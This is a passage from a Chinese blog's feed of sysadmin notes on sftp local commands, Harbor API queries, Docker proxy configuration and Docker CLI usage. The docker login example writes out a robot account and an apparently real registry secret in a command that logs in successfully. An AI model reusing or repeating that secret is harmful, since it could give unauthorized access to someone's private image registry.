title="sftp命令-常规命令前加 l"></a>sftp命令-常规命令前加 l</h4><h5 id="lls"><a href="#lls" class="headerlink" title="lls"></a>lls</h5><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; lls<br> <span class="hljs-attribute">Volume</span> in drive D is 安全<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">5</span>AED-<span class="hljs-number">1001</span><br><br> <span class="hljs-attribute">Directory</span> of D:\other<br><br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">2020</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>  <span class="hljs-number">20</span>:<span class="hljs-number">21</span>    &lt;DIR&gt;          othertools<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">43</span>    &lt;DIR&gt;          test<br>               <span class="hljs-attribute">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>               <span class="hljs-attribute">4</span> Dir(s)  <span class="hljs-number">20</span>,<span class="hljs-number">883</span>,<span class="hljs-number">435</span>,<span class="hljs-number">520</span> bytes free<br></code></pre></td></tr></table></figure><h5 id="lpwd"><a href="#lpwd" class="headerlink" title="lpwd"></a>lpwd</h5><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs autoit">sftp&gt; lpwd<br><span class="hljs-keyword">Local</span> working directory: d:\other<br></code></pre></td></tr></table></figure><h4 id="本地命令-本地存在命令前加"><a href="#本地命令-本地存在命令前加" class="headerlink" title="本地命令-本地存在命令前加 !"></a>本地命令-本地存在命令前加 !</h4><p>!dir</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sftp</span>&gt; !dir<br> <span class="hljs-attribute">Volume</span> in drive D is 安全<br> <span class="hljs-attribute">Volume</span> Serial Number is <span class="hljs-number">5</span>AED-<span class="hljs-number">1001</span><br><br> <span class="hljs-attribute">Directory</span> of D:\other<br><br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          .<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">35</span>    &lt;DIR&gt;          ..<br><span class="hljs-attribute">2020</span>/<span class="hljs-number">12</span>/<span class="hljs-number">25</span>  <span class="hljs-number">20</span>:<span class="hljs-number">21</span>    &lt;DIR&gt;          othertools<br><span class="hljs-attribute">2022</span>/<span class="hljs-number">05</span>/<span class="hljs-number">20</span>  <span class="hljs-number">23</span>:<span class="hljs-number">43</span>    &lt;DIR&gt;          test<br>               <span class="hljs-attribute">0</span> File(s)              <span class="hljs-number">0</span> bytes<br>               <span class="hljs-attribute">4</span> Dir(s)  <span class="hljs-number">20</span>,<span class="hljs-number">883</span>,<span class="hljs-number">435</span>,<span class="hljs-number">520</span> bytes free<br></code></pre></td></tr></table></figure><h5 id="ipconfig"><a href="#ipconfig" class="headerlink" title="!ipconfig"></a>!ipconfig</h5><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">sftp&gt; !ipconfig</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Windows IP Configuration</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Ethernet adapter 以太网</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>   <span class="hljs-attribute">Media State . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">Media disconnected</span><br>   <span class="hljs-attribute">Connection-specific DNS Suffix  . </span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>ftp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iotop</title>
    <link href="/2024/03/04/yunwei/yunweicommands/Linuxcommands/iotop/"/>
    <url>/2024/03/04/yunwei/yunweicommands/Linuxcommands/iotop/</url>
    
    <content type="html"><![CDATA[<span id="more"></span>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>commands</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>commands</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_tips</title>
    <link href="/2024/02/28/yunwei/applications/docker/docker_tips/"/>
    <url>/2024/02/28/yunwei/applications/docker/docker_tips/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h3 id="查询指定镜像仓库镜像列表"><a href="#查询指定镜像仓库镜像列表" class="headerlink" title="查询指定镜像仓库镜像列表"></a>查询指定镜像仓库镜像列表</h3><p><strong>Curl</strong></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">curl -X <span class="hljs-symbol">&#x27;GET</span><span class="hljs-string">&#x27; &#x27;</span>h__ps://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=<span class="hljs-literal">true</span>&#x27;  -H <span class="hljs-symbol">&#x27;accept</span>: application/json&#x27;<br></code></pre></td></tr></table></figure><p><strong>Request URL</strong></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">https</span>://demo.goharbor.io/api/v2.<span class="hljs-number">0</span>/projects?page=<span class="hljs-number">1</span>&amp;page_size=<span class="hljs-number">10</span>&amp;with_detail=true<br></code></pre></td></tr></table></figure><p>q&#x3D;string   </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">格式<span class="hljs-attribute">q</span>=k=v <br><span class="hljs-attribute">q</span>=name=admin 精确匹配<br><span class="hljs-attribute">q</span>=name=~admin 模糊匹配<br></code></pre></td></tr></table></figure><p>q&#x3D;name&#x3D;admin</p><p>page&#x3D;interger</p><p>page_size&#x3D;interger</p><p>name&#x3D;string 指定项目</p><p>sort&#x3D;string  指定排序字段</p><p>public&#x3D;boolean  指定查询公开项目还是私有项目，默认公开项目</p><p>owner&#x3D;string  指定作者</p><p>with_detail&#x3D;boolean  指定是否需要展示详情</p><h3 id="查询指定镜像仓库指定镜像"><a href="#查询指定镜像仓库指定镜像" class="headerlink" title="查询指定镜像仓库指定镜像"></a>查询指定镜像仓库指定镜像</h3><p><strong>CURL</strong></p><p>curl -X ‘GET’ ‘h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1’ -H ‘accept: application&#x2F;json’</p><p><strong>Request URL</strong></p><p>h__ps:&#x2F;&#x2F;demo.goharbor.io&#x2F;api&#x2F;v2.0&#x2F;search?q&#x3D;1</p><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>修改 &#x2F;etc&#x2F;docker&#x2F;daemon.json</p><p>增加以下配置</p><p>正确配置</p><p><a href="https://docs.docker.com/engine/daemon/proxy/">https://docs.docker.com/engine/daemon/proxy/</a></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>  <span class="hljs-attr">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>    <span class="hljs-attr">&quot;http-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://proxy.example.com:3128&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;https-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://proxy.example.com:3129&quot;</span><span class="hljs-punctuation">,</span><br>    <span class="hljs-attr">&quot;no-proxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;*.test.example.com,.example.org,127.0.0.0/8&quot;</span><br>  <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>错误配置（来自豆包），使用错误配置后，重启docker进程会报错</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-attr">&quot;proxies&quot;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation">&#123;</span><br>   <span class="hljs-attr">&quot;default&quot;</span><span class="hljs-punctuation">:</span><br>   <span class="hljs-punctuation">&#123;</span><br>       <span class="hljs-attr">&quot;httpProxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;http://10.222.28.6:7890&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;httpsProxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;https://10.222.28.6:7890&quot;</span><span class="hljs-punctuation">,</span><br>       <span class="hljs-attr">&quot;noProxy&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;localhost,127.0.0.1&quot;</span><br>   <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p>重启docker </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">systemctl restart docker</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>yunweiapplications</category>
      
      <category>docker</category>
      
    </categories>
    
    
    <tags>
      
      <tag>tips</tag>
      
      <tag>yunwei</tag>
      
      <tag>yunweiapplications</tag>
      
      <tag>docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>docker_command</title>
    <link href="/2024/02/20/yunwei/applications/docker/docker_command/"/>
    <url>/2024/02/20/yunwei/applications/docker/docker_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><p>命令基于 mac Docker Desktop 4.11.1 (84025) </p><h1 id="docker服务"><a href="#docker服务" class="headerlink" title="docker服务"></a>docker服务</h1><h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><h3 id="docker-info"><a href="#docker-info" class="headerlink" title="docker info"></a>docker info</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs nix">➜  test docker info<br><span class="hljs-params">Client:</span><br> <span class="hljs-params">Context:</span>    default<br> Debug <span class="hljs-params">Mode:</span> <span class="hljs-literal">false</span><br> <span class="hljs-params">Plugins:</span><br>  <span class="hljs-params">buildx:</span> Docker Buildx (Docker Inc., v0.<span class="hljs-number">8.2</span>)<br>  <span class="hljs-params">compose:</span> Docker Compose (Docker Inc., v2.<span class="hljs-number">7.0</span>)<br>  <span class="hljs-params">extension:</span> Manages Docker extensions (Docker Inc., v0.<span class="hljs-number">2.8</span>)<br>  <span class="hljs-params">sbom:</span> View the packaged-based Software Bill Of Materials (SBOM) for an image (Anchore Inc., <span class="hljs-number">0.6</span>.<span class="hljs-number">0</span>)<br>  <span class="hljs-params">scan:</span> Docker Scan (Docker Inc., v0.<span class="hljs-number">17.0</span>)<br><br><span class="hljs-params">Server:</span><br> <span class="hljs-params">Containers:</span> <span class="hljs-number">10</span><br>  <span class="hljs-params">Running:</span> <span class="hljs-number">2</span><br>  <span class="hljs-params">Paused:</span> <span class="hljs-number">0</span><br>  <span class="hljs-params">Stopped:</span> <span class="hljs-number">8</span><br> <span class="hljs-params">Images:</span> <span class="hljs-number">14</span><br> Server <span class="hljs-params">Version:</span> <span class="hljs-number">20.10</span>.<span class="hljs-number">17</span><br> Storage <span class="hljs-params">Driver:</span> overlay2<br>  Backing <span class="hljs-params">Filesystem:</span> extfs<br>  Supports <span class="hljs-params">d_type:</span> <span class="hljs-literal">true</span><br>  Native Overlay <span class="hljs-params">Diff:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-params">userxattr:</span> <span class="hljs-literal">false</span><br> Logging <span class="hljs-params">Driver:</span> json-file<br> Cgroup <span class="hljs-params">Driver:</span> cgroupfs<br> Cgroup <span class="hljs-params">Version:</span> <span class="hljs-number">2</span><br> <span class="hljs-params">Plugins:</span><br>  <span class="hljs-params">Volume:</span> local<br>  <span class="hljs-params">Network:</span> bridge host ipvlan macvlan <span class="hljs-literal">null</span> overlay<br>  <span class="hljs-params">Log:</span> awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog<br> <span class="hljs-params">Swarm:</span> inactive<br> <span class="hljs-params">Runtimes:</span> runc io.containerd.runc.v2 io.containerd.runtime.v1.linux<br> Default <span class="hljs-params">Runtime:</span> runc<br> Init <span class="hljs-params">Binary:</span> docker-init<br> containerd <span class="hljs-params">version:</span> <span class="hljs-number">10</span>c12954828e7c7c9b6e0ea9b0c02b01407d3ae1<br> runc <span class="hljs-params">version:</span> v1.<span class="hljs-number">1</span>.<span class="hljs-number">2</span><span class="hljs-operator">-</span><span class="hljs-number">0</span><span class="hljs-operator">-</span>ga916309<br> init <span class="hljs-params">version:</span> de40ad0<br> Security <span class="hljs-params">Options:</span><br>  seccomp<br>   <span class="hljs-params">Profile:</span> default<br>  cgroupns<br> Kernel <span class="hljs-params">Version:</span> <span class="hljs-number">5.10</span>.<span class="hljs-number">10</span>4-linuxkit<br> Operating <span class="hljs-params">System:</span> Docker Desktop<br> <span class="hljs-params">OSType:</span> linux<br> <span class="hljs-params">Architecture:</span> aarch64<br> <span class="hljs-params">CPUs:</span> <span class="hljs-number">4</span><br> Total <span class="hljs-params">Memory:</span> <span class="hljs-number">3.841</span>GiB<br> <span class="hljs-params">Name:</span> docker-desktop<br> <span class="hljs-params">ID:</span> <span class="hljs-number">4</span>PPK:ZEQN:<span class="hljs-number">27</span>ZX:<span class="hljs-number">7</span>RDL:BASL:RHIO:UZXN:DTSX:UHWP:HBFU:<span class="hljs-number">2</span>DYI:EJRN<br> Docker Root <span class="hljs-params">Dir:</span> <span class="hljs-symbol">/var/lib/docker</span><br> Debug <span class="hljs-params">Mode:</span> <span class="hljs-literal">false</span><br> HTTP <span class="hljs-params">Proxy:</span> http.docker.internal:<span class="hljs-number">3128</span><br> HTTPS <span class="hljs-params">Proxy:</span> http.docker.internal:<span class="hljs-number">3128</span><br> No <span class="hljs-params">Proxy:</span> hubproxy.docker.internal<br> <span class="hljs-params">Registry:</span> https:<span class="hljs-operator">//</span>index.docker.io<span class="hljs-operator">/</span>v1<span class="hljs-symbol">/</span><br> <span class="hljs-params">Labels:</span><br> <span class="hljs-params">Experimental:</span> <span class="hljs-literal">false</span><br> Insecure <span class="hljs-params">Registries:</span><br>  hubproxy.docker.internal:<span class="hljs-number">5000</span><br>  <span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span><span class="hljs-symbol">/8</span><br> Registry <span class="hljs-params">Mirrors:</span><br>  https:<span class="hljs-operator">//</span>zp98nloz.mirror.aliyuncs.com<span class="hljs-symbol">/</span><br> Live Restore <span class="hljs-params">Enabled:</span> <span class="hljs-literal">false</span><br></code></pre></td></tr></table></figure><h2 id="清除缓存"><a href="#清除缓存" class="headerlink" title="清除缓存"></a>清除缓存</h2><p>docker system prune -a</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs livescript">[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">25</span> minutes ago      Up <span class="hljs-number">25</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker system prune -a</span><br>WARNING! This will remove:<br>- all stopped containers<br>- all volumes <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all networks <span class="hljs-keyword">not</span> used <span class="hljs-keyword">by</span> at least one container<br>- all images without at least one container associated <span class="hljs-keyword">to</span> them<br>Are you sure you want <span class="hljs-keyword">to</span> <span class="hljs-keyword">continue</span>? [y/N] y<br>Deleted Networks:<br>unacc_default<br><br>Total reclaimed space: <span class="hljs-number">0</span> B<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment">#</span><br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker images</span><br>REPOSITORY                        TAG                 IMAGE ID            CREATED             SIZE<br>docker.io/xuxueli/xxl-job-admin   <span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>               <span class="hljs-number">252b</span>168021da        <span class="hljs-number">2</span> years ago         <span class="hljs-number">237</span> MB<br>[root@nvm-14yhwwkhnu5v0 db]<span class="hljs-comment"># docker ps</span><br>CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS                    NAMES<br><span class="hljs-number">84457a</span>2d6565        xuxueli/xxl-job-admin:<span class="hljs-number">2.3</span>.<span class="hljs-number">1</span>   <span class="hljs-string">&quot;sh -c &#x27;java -jar ...&quot;</span>   <span class="hljs-number">26</span> minutes ago      Up <span class="hljs-number">26</span> minutes       <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>:<span class="hljs-number">8080</span>-&gt;<span class="hljs-number">8080</span>/tcp   xxl-job-admin<br></code></pre></td></tr></table></figure><h1 id="镜像仓库"><a href="#镜像仓库" class="headerlink" title="镜像仓库"></a>镜像仓库</h1><h2 id="登录镜像仓库"><a href="#登录镜像仓库" class="headerlink" title="登录镜像仓库"></a>登录镜像仓库</h2><h3 id="docker-login"><a href="#docker-login" class="headerlink" title="docker login"></a>docker login</h3><p><strong>docker login [OPTIONS] [SERVER] [flags]</strong></p><h4 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h4><p>以用户名&#x2F;密码或机器人账户&#x2F;密钥方式登录指定镜像仓库</p><h4 id="SERVER"><a href="#SERVER" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="Flags"><a href="#Flags" class="headerlink" title="Flags"></a>Flags</h4><h5 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password string </span><br></code></pre></td></tr></table></figure><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--password-stdin</span><br></code></pre></td></tr></table></figure><h5 id="u"><a href="#u" class="headerlink" title="-u"></a>-u</h5><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-comment">--username string</span><br></code></pre></td></tr></table></figure><h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>机器人账户：robot-0207</p><p>机器人密钥：wlRCBQX68DCZIrCHoSAvACm1xpdadTBF</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  test docker <span class="hljs-keyword">login</span> registry.xxx.xxx.com -u robot<span class="hljs-number">-0227</span> -p wlRCBQX68DCZIrCHoSAvACm1xpdadTBF<br><span class="hljs-built_in">WARNING</span>! <span class="hljs-keyword">Using</span> <span class="hljs-comment">--password via the CLI is insecure. Use --password-stdin.</span><br><span class="hljs-keyword">Login</span> Succeeded<br></code></pre></td></tr></table></figure><h2 id="退出镜仓库"><a href="#退出镜仓库" class="headerlink" title="退出镜仓库"></a>退出镜仓库</h2><h3 id="docker-logout"><a href="#docker-logout" class="headerlink" title="docker logout"></a>docker logout</h3><p><strong>docker logout [SERVER] [flags]</strong></p><h4 id="描述-1"><a href="#描述-1" class="headerlink" title="描述"></a>描述</h4><p>退出指定镜像仓库</p><h4 id="SERVER-1"><a href="#SERVER-1" class="headerlink" title="SERVER"></a>SERVER</h4><p>指定镜像仓库地址，例如：hub.xxx.com</p><h4 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">➜  <span class="hljs-symbol">~ docker logout</span><br><span class="hljs-symbol">Removing login credentials for https</span>:<span class="hljs-comment">//index.docker.io/v1/</span><br></code></pre></td></tr></table></figure><h1 id="镜像"><a href="#镜像" class="headerlink" title="镜像"></a>镜像</h1><h2 id="查询镜像"><a href="#查询镜像" class="headerlink" title="查询镜像"></a>查询镜像</h2><h3 id="docker-search"><a href="#docker-search" class="headerlink" title="docker search"></a>docker search</h3><p><strong>docker search [OPTIONS] TEAM</strong></p><h4 id="描述-2"><a href="#描述-2" class="headerlink" title="描述"></a>描述</h4><p>默认官方 Docker Hub （hub.docker.com）查找镜像</p><h4 id="OPTIONS"><a href="#OPTIONS" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="f-–filter-filter"><a href="#f-–filter-filter" class="headerlink" title="-f –filter filter"></a>-f –filter filter</h5><p>Filter output based on conditions provided 根据过滤条件过滤镜像</p><h5 id="–no-trunc"><a href="#–no-trunc" class="headerlink" title="–no-trunc"></a>–no-trunc</h5><p>Don’t truncate output 不截断输出，也就是显示完整的镜像描述</p><h5 id="–limit-ini"><a href="#–limit-ini" class="headerlink" title="–limit ini"></a>–limit ini</h5><p>Max number of search results (default 25) 搜索结果的最大数目(默认25个)</p><h5 id="–format-string"><a href="#–format-string" class="headerlink" title="–format string"></a>–format string</h5><p>Pretty-print search using a Go template</p><h4 id="TEAM"><a href="#TEAM" class="headerlink" title="TEAM"></a>TEAM</h4><p>指定需要查询的镜像名</p><h4 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h4><h5 id="查找镜像名包含memcached且收藏数大于10的镜像"><a href="#查找镜像名包含memcached且收藏数大于10的镜像" class="headerlink" title="查找镜像名包含memcached且收藏数大于10的镜像"></a>查找镜像名包含memcached且收藏数大于10的镜像</h5><p>docker search -f stars&#x3D;10 memcached –no-trunc</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  /tmp docker <span class="hljs-keyword">search</span> -f stars=<span class="hljs-number">10</span> memcached <span class="hljs-comment">--no-trunc</span><br><span class="hljs-type">NAME</span>                       DESCRIPTION                                                                       STARS     OFFICIAL   AUTOMATED<br>memcached                  Free &amp; <span class="hljs-keyword">open</span> source, high-performance, distributed memory <span class="hljs-keyword">object</span> caching <span class="hljs-keyword">system</span>.   <span class="hljs-number">2135</span>      [OK]       <br>bitnami/memcached          Bitnami Memcached Docker Image                                                    <span class="hljs-number">32</span>                   [OK]<br>sylvainlasnier/memcached   Memcached docker images based <span class="hljs-keyword">on</span> Ubuntu <span class="hljs-number">14.10</span>. It <span class="hljs-keyword">is</span> small <span class="hljs-keyword">and</span> basic.             <span class="hljs-number">28</span>                   [OK]<br>rapidfort/memcached-ib     RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached IronBank                        <span class="hljs-number">12</span>                   <br>rapidfort/memcached        RapidFort optimized, hardened image <span class="hljs-keyword">for</span> Memcached                                 <span class="hljs-number">11</span>                   <br>prom/memcached-exporter    Exports metrics <span class="hljs-keyword">from</span> memcached servers <span class="hljs-keyword">for</span> consumption <span class="hljs-keyword">by</span> Prometheus.             <span class="hljs-number">10</span>               <br></code></pre></td></tr></table></figure><p>NAME：镜像名</p><p>DESCRIPTION：描述</p><p>START：关注数</p><p>OFFICIAL：是否为docker官方发布</p><p>AUTOMATED：自动构建</p><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><h3 id="docker-pull"><a href="#docker-pull" class="headerlink" title="docker pull"></a>docker pull</h3><p><strong>docker pull [OPTIONS] NAME[:TAG|@DIGEST]</strong></p><h4 id="描述-3"><a href="#描述-3" class="headerlink" title="描述"></a>描述</h4><p>从镜像仓库中拉取或者更新指定镜像，如不选定版本号，则下载最新镜像</p><h4 id="OPTIONS-1"><a href="#OPTIONS-1" class="headerlink" title="OPTIONS"></a>OPTIONS</h4><h5 id="a-–all-tags"><a href="#a-–all-tags" class="headerlink" title="-a –all-tags"></a>-a –all-tags</h5><p>拉取所有tagged镜像</p><h5 id="–distable-content-trust"><a href="#–distable-content-trust" class="headerlink" title="–distable-content-trust"></a>–distable-content-trust</h5><p>忽略镜像的校验，默认是开启校验的</p><h4 id="注意点"><a href="#注意点" class="headerlink" 